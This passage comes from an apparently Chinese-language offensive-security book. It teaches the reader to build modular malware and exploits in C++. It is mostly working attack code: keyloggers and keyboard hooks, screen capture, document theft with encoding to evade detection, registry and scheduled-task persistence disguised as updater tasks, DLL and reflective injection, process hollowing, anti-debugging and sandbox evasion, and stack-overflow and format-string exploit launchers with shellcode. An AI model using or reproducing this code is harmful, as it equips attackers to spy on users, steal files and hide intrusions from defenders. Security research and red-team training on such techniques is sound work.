像设计软件架构一样设计你的恶意软件框架，而不是将所有内容都丢进一个文件，将为你带来长期优势。你可以更快地迭代，规避更多防御，并开发模拟高级持续性威胁的复杂行为。模块化允许你在保持控制的同时进行扩展和适应。

## 5.2 按键记录、截屏和文件窃取

这三项操作——捕捉按键、获取屏幕和窃取文件——是许多信息窃取恶意软件的骨干。在本节中，我们将使用 `C++` 对每一项进行详细分解，重点关注直接系统访问、最小化依赖以及模拟真实世界攻击者的行为。

我们将从按键记录开始。按键记录器的工作很简单：检测哪些键被按下、何时按下以及谁按下。Windows 上最基本的方法是使用 `GetAsyncKeyState()` 轮询状态。虽然这种方法会被安全工具检测，但它仍然可靠且易于在 `C++` 中实现。这是一个简单的循环：

```cpp
while (true) {
    for (char c = 8; c <= 190; ++c) {
        if (GetAsyncKeyState(c) & 0x8000) {
            logKey(c);
        }
    }
    Sleep(10);
}
```

该循环遍历可能的虚拟键码，并检查是否有按键当前被按下。

logKey(c)` 函数应该将键码转换为可读字符并存储或发送结果。为了提高易用性，你需要跟踪 Shift 状态并处理回车、退格和箭头键等特殊键。你可以使用 `GetKeyState(VK_SHIFT)` 判断 Shift 是否按下并相应映射按键。

对于更高级的跟踪，低级键盘钩子 (`WH_KEYBOARD_LL`) 允许你监控系统范围内的输入事件。这种方法更安全且高效，但需要一个回调函数和一个持久的消息循环：

```cpp
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = p->vkCode;
        logKey(vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
```

要激活此钩子，你需要使用 `SetWindowsHookEx()` 注册它，并使用消息泵保持线程存。这为你提供了更清晰、延迟更低的按键捕获，并能与模块化框架更好地集成。



接下来，我们来聊聊屏幕截图。如果你的目标是监控用户的桌面活动，你需要复制屏幕缓冲区并将其保存或传输。。在 Windows 上，这是通过 `GDI`（图形设备接口）完成的。你可以通过创建一个内存兼容的设备上下文并使用 `BitBlt()` 从屏幕传输像素数据，从而将当前屏幕捕获为位图。

以下是你捕获主显示器的简化版本：

```cpp
HWND hwnd = GetDesktopWindow();
HDC hdc = GetDC(hwnd);
HDC hdcMem = CreateCompatibleDC(hdc);
RECT rc;
GetClientRect(hwnd, &rc);
int width = rc.right - rc.left;
int height = rc.bottom - rc.top;
HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, height);
SelectObject(hdcMem, hBitmap);
BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
// At this point, hBitmap contains the screen image
```

现在你可以使用 `GDI+` 或第三方库将 `hBitmap` 编码为 `PNG` 或 `JPEG` 格式，然后将其写入磁盘或通过网络连接发送。对于频繁的捕获，你可以降低分辨率或使用 `JPEG` 压缩来节省带宽。

最后，文件窃取涉及识别目标机器上的高价值文件并静地提取它们。这通常意味着针对文档文件夹并按扩展名进行过滤：`.docx`、`.pdf`、`.xls` 等。你递归遍历文件系统，挑选出匹配的文件，然后将其上传到你的服务器或存储起来备后用。

从目录枚举开始：

```cpp
WIN32_FIND_DATA findFileData;
HANDLE hFind = FindFirstFile("C:\\Users\\Target\\Documents\\*.*", &findFileData);
do {
  if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
    // handle file
  }
} while (FindNextFile(hFind, &findFileData) != 0);
FindClose(hFind);
```

你可以使用 `CreateFile()`、`ReadFile()` 和 `WriteFile()` 来打开、读取和存储任何文件的内容。如果你要发送数据出去，请先对其进行加密或编码——使用类似 `base64` 或 `XOR` 的工具——以避免传输过程中的特征检测。使用类似 `zlib` 的工具压缩大文件也是一个好主意，可以减少传输占用。

在所有这些操作（记录、捕获、窃取）中，你应该避免向磁盘写入过多内存或内存原始原始数据。使用缓冲区，限制一次收集的数量，并利用 `mutexes` 或任务队列，确保你的模块不会争抢资源。所有这些都可以整洁地封装在你先的模块化框架中，每个任务在自己的线程中运行，位于唯一的类下，并向集中式日志记录器或调度器报告结果。

随着学习的深入，考虑在你的模块中添加节流——不要过于激进地记录按键，限制截图间隔，并限制每个会话扫描的文件数量。这模拟了真实的恶意软件行为，并减少由于噪声或大量操作触发安全工具的概率。

键盘记录、截图和数据窃取是攻击性的基础，但当执行得足够干净、安静时，它们将成为长期访问和情报收集的极其有效的工具。

## 5.3 通过注册表和计划任务实现持久化

维持持久化是任何攻击性工具集的关键部分。如果你的恶意软件或植入程序在重启或注销后消失，你就失去了立足点。在 `C++` 中，你可以通过修改特定的 `Registry` 键或创建自动执行有效负载的计划任务在 Windows 上实现持久化。每种方法在隐性、持久性和权限要求方面都有权衡。

让我们从使用 Windows `Registry` 开始。注册表是一个层次化的数据库，存储了操作系统和安装应用程序的低级设置。某些键会在系统启动或用户登录期间自动执行。如果你将恶意软件二进制文件的路径注入到这些键之一，那么它在每次系统启动或用户登录时都会被执行。

一个常用的位置是：
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`

当用户登录时，此键下的任何值都会被执行。所以，如果你在这里写入恶意软件的路径，它将静默启动。

以下是如何使用 Windows API 在 `C++` 中实现：

```cpp
#include <windows.h>

void add_registry_persistence(const char* exePath) {
  HKEY hKey;
  LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
  "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  0, KEY_WRITE, &hKey);
  if (result == ERROR_SUCCESS) {
    RegSetValueExA(hKey, "Updater", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
    RegCloseKey(hKey);
  }
}
```

此函数添加了一个名为“Updater”的值，指向你指定的执行文件路径。在下次登录时，Windows 将运行此二进制文件。

要清理这些，你可以在相同的键上相同的名称调用 `RegDeleteValueA`。

现在，虽然这种方法不需要管理员权限即可工作且相当简单，但它也相对为人已知且容易检测。大多数杀病毒软件和终端检测解决方案都会密切监控此注册表键。

为了增强隐性性或提高可靠性，许多攻击者通过 `Task Scheduler` 使用计划任务。计划任务可以创建为在启动、登录时或定期执行程序。它们提供了更大的灵活性，可以以高权限运行，并在注册表中留下的痕迹较少。

你可以使用 `C++` 通过 `schtasks` 实用程序创建计划任务，或直接调用任务调度器 COM 接口。为了速度和简单，使用 `system()` 调用 `schtasks` 通常足够：

```cpp
#include <stdlib.h>

void add_task_persistence(const char* exePath) {
  char command[512];
  sprintf(command, "schtasks /create /tn \"UpdateChecker\" /tr \"%s\" /sc onlog /rl highest /f", exePath);
  system(command);
}
```

此命令告诉 Windows 创建名为“UpdateChecker”的任务，在登录时以最高权限运行指定的执行文件。`/f` 标志强制创建。

为了更加隐藏，你可以将任务命名为看起来正常的名称，例如“SecurityHealthUpdate”或“OneDriveSync”。你还可以随机化任务名称，或根据当前用户名或主机名命名以防止检测。

如果你以后想删除此任务，可以运行：
```cpp
system("schtasks /delete /tn \"UpdateChecker\" /f");
```

现在考虑你的框架中结合注册表和计划任务持久化。如果其中一个失败或被删除，另一个可能会幸存。你还可以创建虚假条目——不存在的文件路径——来误导分析师并浪费他们的时间。

真实的恶意软件通常会增加层次。它可能会将自己的副本丢到 `C:\ProgramData\WinUpdate\` 等隐藏目录，将文件标记为隐藏和系统，然后让注册表或任务调度器指向该副本而不是原始文件。这使得执行文件不被轻易浏览，并增加了清理步骤。

另一种策略是使用 `WMI`（Windows 管理实例）或 `AppInit_DLLs` 注册表键（针对旧版 Windows 系统）注入启动进程。这些技术更高级，需要更深的系统知识，但在监控环境中可以提供更好的隐性。

在实现这些持久化机制时，始终确保你的文件路径正确引用（特别是包含空格时），并在多个 Windows 版本上进行测试——在 Windows 10 家庭版有效的方法在 Windows 11 专业版或加入域的企业环境中可能不同。

在实践中，你会在应用持久化时记录成功或失败，无论是写入磁盘、事件日志还是你的 C2 通道。这样，如果由于访问限制或终端防御导致设置失败，你就会并在下次回调时尝试替代方法。




持久化关于静静地保持活跃。无论是通过注册表还是计划任务，目标都是融入其中，使你的有效负载（payload）看起来就像系统的另一个部分。你的存在感越不明显，你的会话就能持续得越久。

## 5.4 DLL 注入与反射性加载

攻击性开发（offensive development）中最有效且应用广泛的技术之一是 DLL 注入。它允许你强制目标进程加载你选择的动态链接库（DLL），从而在目标进程的上下文中执行任意代码。这对于规避端点安全工具、向用户隐藏活动以及在不释放传统可执行文件的情况下维持长期访问特别有用。

DLL 注入可以通过多种技术实现，但常用的是使用 Windows API 函数，如 `OpenProcess`、`VirtualAllocEx`、`WriteProcessMemory`、`CreateRemoteThread` 和 `LoadLibraryA`。让我们通过一个基础示例来演示这种方法，它通常被称为基于 `LoadLibrary` 的注入。

假设你有一个名为 `payload.dll` 的 DLL，其中包含你的恶意逻辑。要将此 DLL 注入到运行中的进程中，首先找到目标的进程 ID（PID）。获取 PID 后，使用 `OpenProcess` 配合 `PROCESS_ALL_ACCESS` 打开该进程。使用 `VirtualAllocEx` 在目标内部分配内存，使用 `WriteProcessMemory` 将 DLL 路径写入该内存，然后在进程中启动一个远程线程，调用 `LoadLibraryA` 并将 DLL 路径作为参数。

以下是其在 C++ 中的实现方式：

```cpp
#include <windows.h>
#include <tlhelp32.h>

bool inject_dll(DWORD pid, const char* dll_path) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;
    void* allocMem = VirtualAllocEx(hProcess, nullptr, strlen(dll_path) + 1,
    MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!allocMem) return false;
    WriteProcessMemory(hProcess, allocMem, dll_path, strlen(dll_path) + 1, nullptr);
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
    (LPTHREAD_START_ROUTINE)LoadLibraryA, allocMem, 0, nullptr);
    if (!hThread) return false;
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
```

这种技术在大多数 Windows 版本上都能可靠运行，但它有一个主要的缺点：它会留下痕迹。因为 `LoadLibraryA` 会接触磁盘来加载 DLL，Sysmon 或 EDR 产品可以检测到注入并根据可疑的 DLL 加载或新创建的线程报警。

为了减少这种足迹并完全避免磁盘 I/O，攻击者使用一种更高级的方法称为反射性 DLL 注入（reflective DLL injection）。不再是将 DLL 写入磁盘并让 `LoadLibrary` 加载，而是将 DLL 注入到内存中手动将其映射到远程进程中，包括解析导入、重定位地址以及调用入口——这一切都在内存中完成。

这种方法通过 Stephen Fewer 的 [Reflective DLL Injection] 框架流行。它涉及将整个 DLL 二进制文件嵌入到你的加载器（loader）中，并自行处理内部加载逻辑。你需要理解 PE（可执行文件）格式以及 Windows 加载器在映射 DLL 时执行的步骤。

反射性 DLL 注入通常需要使用自定义入口点编译你的 DLL，该入口点知道如何处理反射。你通常会将 DLL 镜像放置在内存缓冲区中，使用 `VirtualAllocEx` 和 `WriteProcessMemory` 将其拷贝到远程进程，然后使用 `CreateRemoteThread` 执行它，指向有效负载内部的反射加载器存根（stub）。

一个简化的反射加载器在你的注入器中可能像所示：

```cpp
void* buffer = /* 你内存中编译好的 DLL 镜像 */;
DWORD dll_size = /* DLL 镜像的大小 */;
void* remoteBuffer = VirtualAllocEx(hProcess, nullptr, dll_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, remoteBuffer, buffer, dll_size, nullptr);
// 在反射加载器的入口处启动远程线程
CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, nullptr);
```

这完全避免了对文件系统的访问，使其更难被检测或分析。当然，这要求对 PE 格式和加载器内部有更深入理解，包括如何修复重定位、解析导入表以及执行初始化代码。

你还可以对内存中的 DLL 镜像进行加密，仅在运行时注入前对其进行解密。这进一步模糊了有效负载，并有助于规避内存扫描安全工具。

一些现代恶意软件家族和红队工具使用模块化反射加载器，每个组件都是加密的，并且仅在需要时才加载。它们支持将插件（也是 DLL）加载到当前或远程进程中，并允许动态更新功能。这就是 Cobalt Strike 或 Empire 等工具保持扩展性和隐性的方式。

最后，一个真实世界的示例是 meterpreter，它已在红队行动中被广泛使用。与 `msfvenom` 等 shellcode 启动器配合时，你可以通过多种向量传递反射性 DLL——无文件漏洞、钓鱼文档或内存损坏。精通 DLL 注入和反射性加载将赋予你强大的优势。只需记住，加载器必须仔细构建，在多个操作系统版本上进行测试，并经过调试验证，以确保它们不会导致目标进程崩溃。你注入的每一个字节都至关重要。

## 5.5 反调试、进程注入与隐身战术

用 C++ 构建恶意软件或攻击性工具时，你的首要任务之一是确保它们尽可能在不被检测和中断的情况下运行。为了实现这一点，你需要处理三个重要领域：停止或干扰调试器、注入代码以规避检测，以及应用隐身技术以降低可见性。让我们通过实战知识讲解每一个部分。

让我们从反调试开始。调试器是分析师和逆向工程师用于检查恶意软件行为的工具。如果你的有效负载能够检测到正在被调试，它可以停止执行、改变行为或触发误导逻辑。

简单的方法之一是使用 Windows API 中的 `IsDebuggerPresent()`：

```cpp
#include <windows.h>
if (IsDebuggerPresent()) {
    ExitProcess(0);
}
```

这检查进程环境块（PEB）中的一个标志。但也容易绕过。为了更具韧性，可以直接读取 PEB：

```cpp
bool check_peb_being_debugged_flag() {
    BOOL isDebugged = false;
    __asm {
    mov eax, fs:[30h]
    movzx eax, byte ptr [eax+2]
    mov isDebugged, eax
    }
    return isDebugged;
}
```

这种内联汇编在不调用任何高级 API 的情况下从 PEB 读取 BeingDebugged 标志，使其难以拦截。

另一种有效技术是检查软件断点。大多数调试器通过插入 `0xCC` 码来设置断点。你可以扫描代码中的 `0xCC` 并在发现时终止。更高级的检查包括使用 `QueryPerformanceCounter` 或 `GetTickCount` 进行计时分析，以检测执行是否比预想的更长，这通常在单步执行代码时发生。

现在让我们转向进程注入，即在另一个进程的内存空间运行你的代码。这允许你隐藏在 `explorer.exe` 或 `svchost.exe` 等合法的系统进程之后。一种常见的方法是进程镂空（process hollowing）。




在进程镂空（Process Hollowing）中，你使用 `CreateProcess` 配合 `CREATE_SUSPENDED` 标志创建一个挂起状态的合法进程。然后，使用 `NtUnmapViewOfSection` 卸映射其内存，使用 `VirtualAllocEx` 分配新内存，将你的有效负载写入该内存，使用 `SetThreadContext` 设置入口点，最后恢复进程。

以下是简化后的大致思路：

```cpp
STARTUPINFO si = { sizeof(si) };

PROCESS_INFORMATION pi;

CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 卸映射原始段，写入你的负载，修复入口点，恢复线程
```

另一种注入形式是线程劫持（Thread Hijacking），即暂停运行进程中的一个线程，将其指令指针更改指向你的 shellcode，然后恢复执行。你可以使用 `SuspendThread`、`GetThreadContext`、`SetThreadContext` 和 `ResumeThread` 来实现这一点。

如果你在寻找更隐蔽的方法，APC 注入（APC Injection）通过 `QueueUserAPC` 在线程进入可告状态时队列一个执行函数。它对于立即执行的可靠性较低，但更具隐蔽性。

为了完善，你需要应用隐身策略来规避行为检测。这包括以下策略：

- 使用简单的 XOR 加密对字符串进行混淆，以向内存扫描器隐藏 `"cmd.exe"`、`CreateRemoteThread` 或 IP 地址等指标。
- 使用动态解析的 API 调用而不是静态链接。你可以使用 `GetProcAddress` 和 `LoadLibrary` 来避免在二进制文件中包含可读的函数名。
- 避免高频或异常的操作，如写入大量文件或修改敏感的注册表项，除非必要。
- 随机化文件名、互斥量、注册表键和任务名称，以避免基于签名的工具检测。
- 使用 `Sleep` 或 `WaitForSingleObject` 延迟执行，特别是为了逃避沙箱。许多沙箱如果程序在头 30 秒内无所作为，就会放弃。

隐身技术的实际示例是：恶意软件植入程序会检查调试器，反射性地注入到 `explorer.exe` 中，不向磁盘存储任何内容，加密与 C2 服务器的通信，并且在确认未被监控后才在内存中解密负载。这是行为分析师最恐惧的行为，因为它留下了极少的法医痕迹，并避开了防御者查找的所有常规区域。

当你构建攻击性工具时，要策略性地结合这些方法。在早期使用反调试检查，将自己注入到干净进程中执行，并在整个过程中使用加密和混淆。有了这些技术，你的恶意软件将更难被追踪、剖析或停止。

# 第 6 章 – 实战漏洞开发

当你使用 C++ 构建攻击性工具时，理解真实世界中漏洞的工作原理不仅是可选的，更是至关重要的。漏洞是发现漏洞与实现系统完全控制之间的桥梁。在书的这个阶段，你已经处理过内存、注入技术、shellcode 和持久化。现在是时候关注 C 和 C++ 程序中的漏洞是如何被滥用以获取执行控制权的。

本章将探索如何识别原生应用程序中可利用的弱点、编写基于栈的漏洞、操纵格式化字符串、破坏堆以及构造返回面向编程（ROP）链——所有这一切都使用 C++ 作为你自动化、shellcode 集成和利用后负载的工具。每一节都关注攻击者在野外使用的真实技术，而不仅仅是教科书上的理论。

你编写漏洞不仅仅是为了练习。你正在建立一套技能体系，帮助你理解负载如何融入到真实的攻击链中，以及现代漏洞开发如何与 C++ 工具、调试和自定义 shellcode 投递协同工作。

## 6.1 分析与利用 C/C++ 漏洞

当你处理底层漏洞时，你的工作是理解数据是如何与内存相互作用的。不安全的 C 和 C++ 代码经常对输入大小、内存边界或指针有效性做出危险的假设。这些假设创建了漏洞发生的间隙。

如果源代码可用，第一步始终是源码分析。你寻找任何不可信输入到达 `strcpy`、`sprintf` 或类似 `memcpy` 的内存操作函数的地方。这些标准函数不检查边界，因此它们完全依赖程序员的警惕。如果用户输入有可能超过预期的缓冲区大小，该代码就是可利用的。

让我们来看一个简单的漏洞漏洞 C 程序，它接收命令行输入并将其复制到本地缓冲区。

```c
#include <stdio.h>
#include <string.h>

void greet(char *name) {
    char buffer[64];
    strcpy(buffer, name);
    printf("Hello, %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <name>\n", argv[0]);
        return 1;
    }
    greet(argv[1]);
    return 0;
}
```

这看起来是无害的，但 `strcpy` 调用对拷贝字符的数量没有限制。如果你向此程序提供超过 64 字节的数据，溢出将覆盖栈上的返回地址。从那里，你可以将执行重定向到 shellcode 或 ROP 链。

为了理解该漏洞在内存中的行为，请在不启用栈保护的情况下编译程序，并使用溢出缓冲区的输入运行它。`GDB`、`x64dbg` 或 `WinDbg` 等工具允许你在溢出前后检查栈布局。

一旦验证了崩溃，下一步是确定确切的偏移量（offset）。你可以使用循环模式生成器并在调试器中搜索被覆盖的地址。一旦你控制了指令指针，就可以重定向执行。

C++ 可以帮助你自动化和编排这些步骤。这里有一个基础 C++ 程序，它生成长缓冲区并使用该输入启动漏洞二进制。

```cpp
#include <windows.h>
#include <iostream>
#include <string>

int main() {
    std::string payload(200, 'A'); // 缓冲区缓冲区
    std::string command = "vuln.exe " + payload;
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcess(NULL, const_cast<char*>(command.c_str()), NULL, NULL, FALSE,
    CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cerr << "Failed to launch exploit.\n";
    }

    return 0;
}
```

这个简单的封装让你的利用更具重复性。不需要手动输入长字符串，你可以通过编程调整负载大小并测试变体直到命中返回地址。

除了缓冲区溢出，还有许多其他值得分析的常见 C/C++ Bug。差一错误（Off-by-one）、释放后使用（Use-after-free）、空指针解引用和类型混淆都是原生应用程序不稳定的频繁来源。你的工作是发现程序逻辑假设某些内容是安全的，但用户控制的输入证明了相反。

另一个真实案例涉及结构体溢出。当程序分配一个 C 风格结构体并用用户输入填充它时，可能会覆盖相邻的字段或函数指针。假设你在漏洞程序中有以下结构体：

```c
struct user {
    char name[64];
    int privilege_level;
};
```

如果代码使用无边界输入填充 `name` 字段，`privilege_level` 字段就可以被覆盖为任何值。普通用户只需通过溢出自己的 `name` 字段就能变成管理员。



`C` 和 `C++` 特别脆弱的原因在于它们缺乏内置的保护机制。这些语言允许你直接访问内存，但并不会阻止你误用它。这是一种权衡：你获得了速度和力量，但必须承担安全管理内存的责任。大多数开发者关注的是功能和截止日期，因此他们编写的代码通常在预期情况下可以编译并运行；而攻击者则编写在非预期情况下能使这些代码崩溃的输入。

作为一名攻性程序员，你负责构建工具来分析这些意外之外的路径。你编写模糊器（fuzzers）来生成畸形输入。你使用 `C++` 脚本监控内存使用情况、拦截输出并验证漏洞的可利用性。练习这些技能不需要任何奇特的 0-day 漏洞——有很多开源应用程序、CTF 挑战以及专门为此目的设计的故意漏洞软件。

花点时间探索已知的 CVE，并观察它们是如何被利用的。研究诸如 `CVE-2017-0143` (EternalBlue) 或 `CVE-2018-8174` (VBScript UAF) 等案例，这些问题的根源都是内存处理中的经典错误。它们都是用 `C` 和 `C++` 编写的，通过剖析它们，你可以学习那些会反复出现的真实模式。

在攻性安全中，编写可靠的利用程序是一项通过一个个 Bug 建立起来的技能。你发现漏洞，研究内存如何响应畸形输入，隔离对执行的控制，然后将其链接到有用的载荷（payload）。`C++` 是帮助你编写这些载荷并将所有一切连接在一起的语言。

这种漏洞分析的基础让你能够不断进步。从这里开始，你将编写基于栈的利用程序、操纵格式字符串并探索高级堆攻击。一切都始于理解代码在何处失效——并利用这种失败来让自己有利。

## 6.2 编写基于栈的利用程序

栈缓冲区溢出是底层漏洞利用中最老且最强大的攻击向量之一。当程序写入栈缓冲区的数据超过了其分配的存储空间时，就会发生溢出，导致溢出损坏相邻的内存——最关键的是保存的返回地址。一旦你控制了该返回地址，你就实际上劫持了程序的控制流。

为了理解这在实践中如何工作，你首先需要可视化函数调用期间栈的结构。当函数被调用时，局部变量在栈上分配。在它们正上方是保存的基址指针（base pointer），再上方就是返回地址。如果你能够溢出本地缓冲区并到达返回地址，你就可以将其覆盖为任何你想要的地址。该地址可以指向 shellcode、ROP 链，甚至是一个系统调用。

让我们来看一个简单的 `C` 示例，将作为漏洞目标。

```c
#include <stdio.h>
#include <string.h>

void get_input(char *user_input) {
    char buffer[64];
    strcpy(buffer, user_input);
    printf("Input received: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    get_input(argv[1]);
    return 0;
}
```

该程序包含一个向本地栈缓冲区的无界界 `strcpy`。由于没有长度检查，因此任何超过 64 字节的内容都会开始破坏相邻的内存。最终，如果输入足够长，它将到达保存的返回地址。覆盖该地址允许你劫持执行流。

你可以通过在 Linux 上禁用保护的情况下编译程序来测试这一点：

```bash
gcc -fno-stack-protector -z execstack -no-pie -o stack_vuln stack_vuln.c
```

当你使用 80 或 100 个字符运行程序时，它会崩溃。你可以使用 `GDB` 和循环模式（cyclic pattern）找到到达返回地址的精确偏移量。Metasploit 中的 `pattern_create` 和 `pattern_offset` 等工具可以帮助你确定控制需要多少字节。

一旦确定了偏移量，下一步是构建一个包含填充（padding）、新返回地址以及可选 shellcode 的载荷。

在实际攻击中，你通常希望返回地址指向内存中你的 shellcode 所在的位置。如果栈上有可执行内存空间，你可以将 shellcode 直接放置在溢出中。以下是一个 `C++` 启动器中此类载荷可能种样的简单示例：

```cpp
#include <windows.h>
#include <iostream>
#include <string>

int main() {
    // 填充到达返回地址
    std::string padding(72, 'A');
    // 用 shellcode 的地址覆盖 EIP
    unsigned int ret = 0x00401520; // 示例地址（必须根据二进制文件调整）
    // 启动 calc.exe 的示例 shellcode (Windows 32 位)
    unsigned char shellcode[] =
    "\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\xb8\xc7\x93\xc2\x77\xff\xd0";

    // 构建完整载荷
    std::string payload = padding;
    payload.append(reinterpret_cast<char*>(&ret), sizeof(ret));
    payload.append(reinterpret_cast<char*>(shellcode), sizeof(shellcode) - 1);

    // 带有载荷启动漏洞二进制文件
    std::string command = "stack_vuln.exe \"" + payload + "\"";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, const_cast<char*>(command.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cerr << "利用启动失败。\n";
    }

    return 0;
}
```

这段代码自动化了一切：它构建带有正确填充的缓冲区，注入 shellcode 并启动目标。这就是你从理论利用转向构建可重复工具的过程。

如果系统具有 `DEP` 或 `ASLR` 等保护措施，你需要进行调整。`DEP` 使栈变为不可执行，这意味着直接在溢出中放置 shellcode 将无效。在这种情况下，你必须使用 `ROP` 来调用如 `VirtualProtect` 的内存标记函数，然后再跳转到你的载荷。这些在书中后面会有详细介绍，但即使是基础的基于栈的利用在配置不当的目标上仍然可能成功。

在现实场景中，栈溢出出现在网络守护进程、解析代码、文件格式处理程序以及任何盲目复制输入的代码中。许多嵌入式设备和专有软件编译时保护极少，使其成为极佳的目标。

## 6.3 格式字符串漏洞




当开发者使用 `printf(user_input)` 而不是 `printf("%s", user_input)` 时，危险就开始了。第一种形式将输入视为格式字符串，而不仅仅是原始数据。这意味着输入字符串中的特殊字符如 `%x`、`%n` 或 `%s` 将解释为格式化符，而不是内容。由于格式化符直接与栈上传递的内存地址绑定，你可以通过操纵这些格式化符来控制读取或写入的数据。

这里是一个展示此问题的存在漏洞的 C 语言。

```c
#include <stdio.h>

#include <stdlib.h>

void display(char *input) {
    printf(input);
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <string>\n", argv[0]);
        return 1;
    }
    display(argv[1]);
    return 0;
}
```

使用类似 `AAAA` 的基本输入运行此二进制文件只会打印“AAAA”。但当你传入 `%x %x %x %x` 时，程序将打印栈上的四个值。这些值是内存中的原始数据，你可以不断增加 `%x` 格式化符的数量，以深层泄露栈。

要理解发生了什么，请在 GDB 中启动此二进制文件并单步执行。你会看到每个 `%x` 都会从栈中消耗一个值。通过精心构造输入，你可以泄露内存地址、找到返回地址，甚至在动态链接的二进制文件中定位 GOT 条目。

当引入 `%n` 格式化符时，该漏洞变得更加强大。该指令会将目前为止打印的字符数写入到作为参数提供的内存地址中。如果你能将函数指针或返回地址的地址放置在栈的正确位置，你就可以用任意值覆盖它。

让我们来看一个 Linux 系统上的示例，在在该系统中你使用格式字符串漏洞来覆盖返回地址或 GOT 条目。

首先，你识别一个想要覆盖的全局变量或函数指针。假设目标是 `exit()`，它存在于 GOT 中。你可以使用 `%x` 模式泄露它的地址，直到看到它的值。然后，你注入一个构造好的格式字符串有效负载，将 GOT 条目的地址放在输入字符串中，并使用 `%n` 来覆盖它。

手动创建此利用程序很慢，因此你可以使用 C++ 来脚本并自动化此过程。这里有一个基础启动器，演示了你如何注入格式字符串有效负载并运行二进制文件。

```cpp
#include <windows.h>
#include <iostream>
#include <string>

int main() {
    // 使用带有格式化符的负载来泄露栈内存
    std::string payload = "%x %x %x %x %x %x %x %x";
    std::string command = "vuln.exe \"" + payload + "\"";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, const_cast<char*>(command.c_str()), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cerr << "Failed to run vulnerable binary.\n";
    }
    return 0;
}
```

这段代码没有直接利用 `%n` 向量，但它为你提供了一种通过格式字符串观察栈行为的方法。完整的 `%n` 利用需要你知道到目标地址的的确切栈偏移，并使用填充来打印正确数量的字符。

在许多真实世界的漏洞中，攻击者目标是 `exit`、`free` 或 `puts` 等函数的 GOT 条目。覆盖这些内容允许任意代码执行。这在未启用 RELRO 等保护措施的旧二进制文件中特别为有效。即使在今天，许多嵌入式系统和 IoT 设备仍在使用此类未开启栈丝雀（stack canaries）、ASLR 或只读 GOT 区域的二进制文件。

一个著名的历史案例是 `wu-ftpd` FTP 服务器中的格式字符串漏洞。该服务器允许远程攻击者构造用户提供的格式字符串，导致任意代码的执行。这类漏洞也曾在 ISC DHCP 守护进程以及几个向未身份验证用户暴露 syslog 或日志写入功能的嵌入式产品中被利用。

格式字符串利用不仅对于代码执行非常强大，对于侦察也是如此。在获得利用路径之前，你可以使用它们来泄露内存地址、栈内容和二进制布局——这些信息对于构建后续负载至关重要，特别是在具有 ASLR 或栈保护的环境中。

这类漏洞也适用于 C++ 程序，特别是当开发者将 C 风格的 printf 格式化与字符串操作混合，或者在使用未转义用户输入的日志记录机制时。你可能会发现开发者在没有过滤的情况下使用 `fprintf(logfile, userInput)`。这打开了完全相同的大门——如果进程以 SYSTEM 或 root 身份运行，可能具有管理员权限。

为了防止格式字符串漏洞，请始终对变变函数使用固定格式化符。诸如 `snprintf(buffer, size, "%s", input)` 的函数是安全的。但一旦你允许用户输入控制格式字符串本身，你就放弃了内存安全。

作为一名攻击性程序员，你的任务是寻找这些疏忽。查看遗留 C 或 C++ 代码中的每一个 `printf`、`syslog` 和 `sprintf` 调用。追踪格式字符串是否曾受到用户数据的影响。如果是，你就拥有了一个内存泄露或任意写入利用的强有力候选目标。一旦你拥有了它，攻击链的其余部分就会变得简单得多。

## 6.4 堆利用与释放后使用

虽然栈的漏洞关注固定大小的局部变量，但堆漏洞针对动态分配的内存——即通过 `malloc`、`new` 或 `HeapAlloc` 创建的内存。在许多现实应用程序中，特别是处理变长输入的程序，堆是一个主要的攻击面。堆漏洞类别之一是释放后使用（UAF），即程序在内存释放后继续使用指针。

让我们解析这是发生的。

当程序使用 `free` 或 `delete` 释放内存时，该块被内存分配器标记为可用。但指针本身如果没有置空或覆盖，仍然存在。如果该失效指针被访问（无论是读取还是写入），程序现在操作它不再拥有的内存。在最好的情况下，这会导致崩溃。在最坏的情况下，该内存已被重新分配给攻击者，此时 UAF 允许读写。

